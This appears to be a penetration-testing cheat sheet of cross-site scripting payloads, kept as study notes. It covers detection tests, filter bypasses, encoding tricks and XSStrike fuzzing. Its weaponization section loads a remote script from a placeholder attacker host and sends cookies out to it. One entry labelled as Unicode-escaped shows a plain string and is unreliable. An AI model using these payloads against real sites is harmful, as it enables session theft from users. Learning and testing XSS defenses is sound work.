#web #xss #javascript

# Cross-Site Scripting (XSS)

Related: [csrf-cors-csp](csrf-cors-csp.md) · [nosqli](nosqli.md) · [secure-coding-js](../CodeReview/secure-coding-js.md) · [fuzzing](fuzzing.md)

## Detection Payloads
```html
<script>alert(window.origin)</script>
```
Basic reflected/stored XSS test.

```html
<plaintext>
```
Breaks page rendering — quick injection test.

```html
<img src="" onerror=alert(window.origin)>
```
HTML-attribute (event handler) XSS.

## Proof-of-Concept Actions
```html
<script>document.body.style.background = "#141d2b"</script>
```
Change background color (visual PoC).

```html
<script>document.title = 'HackTheBox Academy'</script>
```
Change the page title (visual PoC).

## Weaponization
```html
<script src="http://OUR_IP/script.js"></script>
```
Load a remote attacker script.

```html
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```
Exfiltrate cookies to the attacker.

## Tooling
```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
Fuzz a parameter for XSS with XSStrike.

```bash
sudo php -S 0.0.0.0:80
```
Host the exfil/collector script (also `sudo nc -lvnp 80` to catch requests).

## Filter Bypasses
```html
<ScRiPt>alert(1);</ScRiPt>
```
Case variation against weak blacklists.

```html
<svg/onload=alert(1)>
```
No-space bypass.

```html
<img src=x OnErRoR=alert(1)>
```
Mixed-case event handler.

## Encoding / Sink Tricks
```javascript
String.fromCharCode(97,108,101,114,116,40,49,41)
```
Build "alert(1)" without literal characters.

```javascript
eval(atob("YWxlcnQoMSk="))
```
Base64-decode and eval (also `setTimeout`, `setInterval`, `Function()`, `[].constructor.constructor(...)` as sinks).

```javascript
"alert(1)"
```
Unicode-escaped "alert(1)" (also octal `\141...` / hex `\x61...`).
